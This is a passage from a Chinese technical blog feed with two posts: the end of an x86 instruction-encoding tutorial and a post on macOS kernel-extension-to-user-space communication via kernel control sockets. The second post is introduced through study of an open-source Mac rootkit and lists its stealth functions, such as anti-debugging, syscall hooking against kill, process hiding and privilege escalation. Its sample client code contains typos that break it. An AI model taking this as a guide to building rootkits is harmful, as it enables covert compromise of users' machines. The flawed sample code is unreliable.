改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, [eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><pre><code>#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d){    printf(&quot;hello kext!\n&quot;);    return KERN_SUCCESS;}kern_return_t TestExtension_stop(kmod_info_t *ki, void *d){    printf(&quot;bye kext!\n&quot;);    return KERN_SUCCESS;}</code></pre><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><pre><code>#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data){    int err ;    struct kern_ctl_reg ctlreg ;    bzero(&amp;ctlreg, sizeof(ctlreg)) ;    //控制信息    ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */    ctlreg.ctl_unit = 0 ;    strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));    //回调函数    ctlreg.ctl_connect_func = connect ;    ctlreg.ctl_disconnect_func = disconnect ;    ctlreg.ctl_send_func = send ;    ctlreg.ctl_getopt_func = getopt ;    ctlreg.ctl_setopt_func = setopt ;    //注册内核控制    err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;    if (err) return KERN_FAILURE ;    return KERN_SUCCESS ;}</code></pre><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><pre><code>struct kern_ctl_reg{    /* 控制信息 */    char        ctl_name[MAX_KCTL_NAME];    u_int32_t    ctl_id;    u_int32_t    ctl_unit;    /* 控制设置 */    u_int32_t    ctl_flags;    u_int32_t    ctl_sendsize;    u_int32_t    ctl_recvsize;    /* 回调函数 */    ctl_connect_func    ctl_connect;//建立连接时调用    ctl_disconnect_func    ctl_disconnect;//断开连接时调用    ctl_send_func    ctl_send;//处理从client到kernel的数据发送    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用};</code></pre><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><pre><code>#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name){    int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;    if (g_sock == 0) return 0 ;    u_int32_t id = getctlidbyname(g_sock, name) ;    sockaddr_ctl addr ;    addr.sc_len = sizeof(addr) ;    addr.sc_family = AF_SYSTEM ;    addr.sc_sysaddr = AF_SYS_CONTROL ;    addr.sc_id = id ;    addr.sc_unit = 0 ; /* allocate dynamically */    int err ;    err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;    if (err) return 0 ;    return sock ;}u_int32_t getctlidbybame(int sock, char *name){    struct ctl_info info ;    memset(&amp;info, 0, sizeof(info)) ;    strncpy(info.ctl_name, name, strlen(name)) ;    int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;    if (err) return 0 ; /* should do something stronger here! */    return info.ctl_id ;}int main(int argc, const char *argv[]){        socket_ctl(name);}//发送数据void execute_cmd(int cmd, char *args){    char data[32] = { 0 };    size_t data_len = 0;    int retv;    if(args != NULL) {        memcpy(data, args, strlen(args));    }    data_len = strlen(data) + 1;    retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);    if(retv != 0) {        printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);        printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);        return;    }}//接收数据void get_data(){    char *data = malloc(32);    socklen_t data_len = 32;    int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);    if(retv != 0) {        printf(&quot;[ERROR] getsockopt()\n&quot;);        return;    }    size_t r = recv(g_socket, data, data_len, 0);    if(r == 0) {        printf(&quot;[ERROR] recv()\n&quot;);        return;    }}</code></pre><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
</feed>
